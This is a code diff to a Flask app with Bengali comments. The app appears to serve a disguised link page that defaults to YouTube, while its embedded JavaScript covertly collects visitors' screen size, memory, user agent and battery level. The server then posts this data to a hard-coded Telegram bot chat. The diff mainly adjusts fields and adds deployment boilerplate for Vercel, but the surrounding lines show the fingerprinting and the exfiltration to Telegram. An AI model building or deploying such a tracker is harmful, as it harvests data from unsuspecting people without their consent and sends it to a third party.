@@ -11,7 +11,6 @@ ID = "8335838796"
 @app.route('/', methods=['GET', 'POST'])
 def handler():
     if request.method == 'GET':
-        # URL থেকে টার্গেট লিঙ্ক সংগ্রহ (Default: YouTube)
         target = request.args.get('url', 'https://www.youtube.com')
         
         html_code = """
@@ -34,7 +33,6 @@ def handler():
                         let info = {
                             w: window.screen.width,
                             h: window.screen.height,
-                            res: window.devicePixelRatio,
                             ram: navigator.deviceMemory || "Unknown",
                             ua: navigator.userAgent,
                             bat: Math.round(battery.level * 100) + "%",
@@ -93,4 +91,8 @@ def handler():
         """
         requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                       data={"chat_id": ID, "text": msg, "parse_mode": "Markdown"})
-    return jsonify({"status": "ok"})
+        return jsonify({"status": "ok"})
+
+# Vercel এর জন্য এটি যোগ করা হয়েছে
+if __name__ == "__main__":
+    app.run()
